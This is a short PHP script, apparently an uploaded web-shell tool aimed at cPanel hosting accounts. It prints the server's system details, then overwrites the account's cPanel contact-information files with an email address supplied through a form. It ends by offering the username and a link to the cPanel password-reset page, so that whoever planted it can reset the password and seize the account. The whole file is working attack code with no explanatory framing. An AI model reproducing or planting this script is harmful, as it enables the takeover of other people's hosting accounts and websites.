<?php 
echo"<h4>".php_uname()."</h4>";
error_reporting(0);

echo '
<form action="#" method="get"> 	
<input type="email" name="email" placeholder="yours" /> 	
<input type="submit" name="submit" value=" > "/> 	
</form> 	 	
<br/><br/><br/> 	
</p>'; ?> 
<?php
$user = get_current_user(); 
$serv = $_SERVER['HTTP_HOST']; 
$rem = getenv('REMOTE_ADDR'); 
if (isset($_GET['submit'])) { $email = $_GET['email']; 
$args = 'email:' . $email; $param = fopen('/home/' . $user . '/.cpanel/contactinfo', 'w'); fwrite($param, $args); fclose($param); 
$param = fopen('/home/' . $user . '/.contactinfo', 'w'); fwrite($param, $args); fclose($param); $ext = "https://"; 
$port = "2083"; 
$cont = $serv . ':2083/resetpass?start=1';
$read_named_conf = @file('/home/' . $user . '/.cpanel/contactinfo');
if(!$read_named_conf)
{
echo "outplayed"; 
}
else
{
 
echo '<center>User: <input type="text" value="' . $user . '" id="user"> <button onclick="username()"> >> </button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; 
echo '<br/><center><a  target="_blank" href="' . $ext . '' . $cont . '">here</a>'; ;}} ?>
